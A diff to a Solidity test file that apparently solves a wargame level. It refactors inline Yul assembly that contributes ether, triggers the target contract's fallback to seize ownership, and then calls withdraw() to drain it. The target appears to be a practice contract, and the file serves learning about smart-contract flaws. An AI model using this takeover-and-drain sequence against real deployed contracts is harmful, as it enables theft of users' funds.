@@ -29,17 +29,16 @@ contract FallbackTest is BaseTest {
     }
 
     function exploitYul() internal override {
-        address _to = address(fallbackInstance); // TODO: read it using sload and then use
         assembly {
             // Function Sig for contribute()
             mstore(0x00, 0xd7bb99ba00000000000000000000000000000000000000000000000000000000)
-            let success := call(gas(), _to, 1000000000000, 0x00, 0x04, 0x00, 0x00)
+            let success := call(gas(), sload(fallbackInstance.slot), 1000000000000, 0x00, 0x04, 0x00, 0x00)
             if iszero(success) { revert(0, 0) }
-            success := call(gas(), _to, 1000000000000000000, 0x00, 0x00, 0x00, 0x00)
+            success := call(gas(), sload(fallbackInstance.slot), 1000000000000000000, 0x00, 0x00, 0x00, 0x00)
             if iszero(success) { revert(0, 0) }
             // Function Sig for withdraw()
             mstore(0x00, 0x3ccfd60b00000000000000000000000000000000000000000000000000000000)
-            success := call(gas(), _to, 0, 0x00, 0x04, 0x00, 0x00)
+            success := call(gas(), sload(fallbackInstance.slot), 0, 0x00, 0x04, 0x00, 0x00)
             if iszero(success) { revert(0, 0) }
         }
     }
